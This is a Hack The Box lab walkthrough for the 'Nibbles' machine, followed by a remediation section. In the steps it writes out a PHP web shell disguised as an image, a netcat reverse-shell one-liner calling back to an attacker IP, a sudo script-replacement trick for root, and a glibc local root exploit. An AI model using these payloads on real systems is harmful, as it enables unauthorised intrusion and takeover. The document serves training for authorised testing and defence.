---
title: "Nibbles HTB - Easy Linux Box Walkthrough"
date: 2025-09-22T14:00:00Z
tags: ["easy-linux", "nmap", "nibbleblog", "cms", "file-upload", "credential-guessing", "sudo-misconfiguration", "kernel-exploit", "privilege-escalation", "cve-2015-6967", "burp-suite", "reverse-shell", "ubuntu-xenial", "TJ_Null OSCP Prep", "directory-enumeration"]
difficulty: ["easy"]
categories: ["HTB", "Linux"]
draft: false
description: "Complete walkthrough of Nibbles HTB machine featuring Nibbleblog CMS exploitation, file upload vulnerability, credential guessing, and sudo privilege escalation techniques"
---

# Nibbles HTB - Easy Linux Box Walkthrough

{{< youtube s_0GcRGv6Ds >}}

## Key Exploitation Steps and Techniques

### Key Exploitation Steps and Techniques (Chronological Order)

Based on the provided transcript, here is a chronological extraction of the key steps and techniques used to exploit the "Nibbles" machine from Hack The Box. I've focused on the main actions, tools, and techniques, omitting minor troubleshooting or unrelated asides.

1. **Initial Network Scanning**: Create a directory for results and run an Nmap scan with default scripts (`-sC`), service version detection (`-sV`), verbose output (`-vvv`), and all output formats (`-oA`) on IP [TARGET-IP]. Discovers port 80 (HTTP) open.

2. **Web Server Enumeration**: Access the root web page on port 80, which displays "Hello World". Use Burp Suite to intercept requests and identify the server as Apache 2.4.18 on Ubuntu (Xenial). Note a HTML comment pointing to `/nibbleblog/`.

3. **Application Identification and Version Enumeration**: Access `/nibbleblog/` and identify it as Nibbleblog CMS. Download the latest release from the official site, unzip it, and grep for version strings (e.g., `grep -r "4.0.5" .`). Compare with the target by viewing source of `/nibbleblog/admin.php` (exposes PHP code due to `.bit` extension), confirming version 4.0.3.

4. **Vulnerability Research**: Search Exploit-DB for Nibbleblog vulnerabilities. Identify a file upload vulnerability (CVE-2015-6967) in version 4.0.3 via the "My Image" plugin, requiring admin credentials. Review Metasploit module and related blog post for details: exploit involves uploading a shell via the plugin.

5. **Credential Enumeration**: Browse `/nibbleblog/content/private/users.xml` (open directory), revealing username "admin" and a potential failed login counter (blacklist).

6. **Brute Force Attempt and Bypass**: Attempt Hydra brute force on `/nibbleblog/admin.php` with username "admin" and a small password list (RockYou top 50). Triggers IP-based blacklist. Bypass by setting up an SSH local port forward (`-L 9000:[TARGET-IP]:80`) via another compromised machine (Falafel at [PIVOT-IP]) to proxy requests.

7. **Credential Guessing**: Through the proxy, manually guess password "nibbles" for "admin" (possibly default or lucky guess based on app name). Successfully logs in.

8. **Plugin Activation and Shell Upload**: In admin panel, enable "My Image" plugin. Upload a malicious PHP shell (simple `system($_REQUEST['cmd'])` script with GIF magic bytes prefixed) disguised as an image via the plugin upload form.

9. **Shell Access and Command Execution**: Access the uploaded shell at `/nibbleblog/content/private/plugins/my_image/image.php?cmd=whoami`. Use Burp Repeater to send commands (e.g., `whoami` confirms execution).

10. **Reverse Shell Upgrade**: In Repeater, change to POST method and inject a reverse shell payload (Netcat: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [ATTACKER-IP] 9001 >/tmp/f`). Catch the shell on attacker's Netcat listener. Upgrade to interactive shell with Python TTY (`python3 -c 'import pty; pty.spawn("/bin/bash")'`), then `stty raw -echo` for better functionality.

11. **User Privilege Access**: In the shell, navigate to `/home/nibbler/` and read `user.txt` (32-character MD5 hash).

12. **Privilege Escalation Check**: Run `sudo -l`, revealing user "nibbler" can run `/home/nibbler/personal/stuff/monitor.sh` as root without password.

13. **Sudo Exploitation**: Create the directory path (`mkdir -p /home/nibbler/personal/stuff`), write a malicious `monitor.sh` (`#!/bin/bash\nbash`), make it executable (`chmod +x monitor.sh`), and execute `sudo /home/nibbler/personal/stuff/monitor.sh` to gain root shell.

14. **Alternative Root via Kernel Exploit**: Use Linux Exploit Suggester (transferred via HTTP server) to identify vulnerabilities. Detects glibc 2.23-0ubuntu9 on Ubuntu 16.04.3. Download and compile "RationalLove" exploit (glibc getcwd POC from Exploit-DB). Execute it to gain root shell.

15. **Root Access Confirmation**: As root, read `/root/root.txt` (32-character MD5 hash).

## Security Gaps and Remediation

### Web Server (Apache 2.4.18 on Ubuntu Xenial)

- **Information Disclosure via HTML Comments**: The root page contains a comment revealing the /nibbleblog/ directory, aiding path discovery.
  - **Fix**: Source code fix - Remove or obfuscate sensitive comments in the index.html or equivalent file.

- **Exposed Server Version in HTTP Headers**: Burp Suite interception reveals Apache version and OS details, allowing targeted exploit research.
  - **Fix**: Configuration fix - Edit apache2.conf or httpd.conf to set `ServerTokens Prod` and `ServerSignature Off` to minimize banner information.

- **Open Directory Listing in /nibbleblog/content/private/**: Allows access to users.xml, exposing usernames and potential login attempt counters.
  - **Fix**: Configuration fix - Add `.htaccess` with `Options -Indexes` or configure Apache's Directory directive to deny listings; alternatively, source code fix in CMS to restrict directory permissions programmatically.

### Content Management System (Nibbleblog 4.0.3)

- **Outdated Software Version**: Running an end-of-life version (last release 2014) vulnerable to known exploits like CVE-2015-6967 (authenticated file upload).
  - **Fix**: Source code fix - Update to a patched or maintained fork if available, or migrate to a secure CMS; if custom, patch the upload handling in plugins/my_image/upload.php to validate file types and extensions strictly.

- **Source Code Exposure via Non-PHP Extensions**: Files like admin.php.bit are served as plain text due to include mechanisms not executing non-.php files.
  - **Fix**: Source code fix - Rename or refactor included files to .php extensions; configuration fix - Configure Apache to deny serving .bit files or add MIME type handling.

- **Weak Default/Guessable Credentials**: Username "admin" with password "nibbles" (app name-based), easily guessed.
  - **Fix**: Configuration fix - Change default credentials during installation and enforce strong password policies; source code fix - Modify install.php to require complex passwords and remove default accounts.

- **IP-Based Blacklist on Login Attempts**: Triggers lockout after failed logins but is bypassable via proxies or IP spoofing.
  - **Fix**: Source code fix - Enhance admin.php to use more robust rate-limiting (e.g., CAPTCHA after failures) or session-based tracking instead of IP-only.

- **Authenticated Arbitrary File Upload in "My Image" Plugin**: Allows uploading PHP shells disguised as images without sufficient validation.
  - **Fix**: Source code fix - In plugins/my_image/upload.php, add strict MIME type checks, extension whitelisting (e.g., only .jpg, .png), and content validation (e.g., using getimagesize()); disable plugin if unused.

- **Lack of Input Sanitization in Upload Paths**: Uploaded files are stored in predictable locations without renaming or hashing.
  - **Fix**: Source code fix - Implement random file naming and store outside web root if possible; configuration fix - Restrict write permissions on content/private/ directories.

### User Authentication and Access Control

- **Exposed User Enumeration File (users.xml)**: Reveals admin username and blacklist data, facilitating targeted attacks.
  - **Fix**: Source code fix - Move sensitive data to a database or encrypt it; configuration fix - Protect the file with .htaccess deny rules or remove world-readable permissions.

- **No Brute-Force Protection Beyond Basic Blacklist**: Hydra brute-force triggers ban but is ineffective against distributed attacks.
  - **Fix**: Source code fix - Integrate fail2ban or similar in admin.php for dynamic banning; configuration fix - Set up mod_security rules for login endpoints.

### Sudo Configuration

- **Overly Permissive Sudoers Rule**: User "nibbler" can run /home/nibbler/personal/stuff/monitor.sh as root without password, allowing arbitrary command injection by creating the script.
  - **Fix**: Configuration fix - Edit /etc/sudoers to remove or tighten the rule (e.g., specify exact commands without paths allowing user control); use `sudo -l` audits regularly.

### Operating System/Kernel (Ubuntu 16.04.3 with glibc 2.23-0ubuntu9)

- **Outdated and Vulnerable Kernel/glibc**: Susceptible to exploits like RationalLove (CVE-2018-1000001 variant or similar glibc getcwd issue).
  - **Fix**: Configuration fix - Update the system with `apt update && apt upgrade` to patch glibc and kernel; enable automatic security updates.

- **Hostname Resolution Issues in Sudo**: Sudo attempts DNS lookups, causing delays and potential errors if /etc/hosts is misconfigured.
  - **Fix**: Configuration fix - Add proper entries to /etc/hosts (e.g., 127.0.0.1 nibbles); disable hostname lookups in sudoers with `Defaults !fqdn`.

- **Presence of Netcat and Python for Reverse Shells**: Allows easy outbound connections for attackers once initial access is gained.
  - **Fix**: Configuration fix - Remove unnecessary tools like netcat if not required (`apt remove netcat`); restrict outbound firewall rules with ufw.

- **World-Writable or Predictable Directories for Privilege Escalation**: Allows creating paths like /home/nibbler/personal/stuff/ for sudo abuse.
  - **Fix**: Configuration fix - Set strict permissions on home directories (`chmod 750 /home/nibbler`); audit and remove unused sudo rules.

## Conclusion

Nibbles is an excellent beginner-friendly machine that demonstrates common web application vulnerabilities and basic Linux privilege escalation techniques. It requires understanding of:

- Web enumeration and content management system identification
- File upload vulnerability exploitation in CMS plugins
- Credential guessing and authentication bypass techniques
- Sudo misconfiguration exploitation for privilege escalation
- Alternative kernel exploit methods for root access
- Basic reverse shell techniques and shell upgrading

This machine serves as an ideal introduction to web application security and Linux privilege escalation, making it perfect for OSCP preparation and foundational penetration testing skills.

---

*This walkthrough covers the complete exploitation chain for educational purposes in authorized testing environments only.*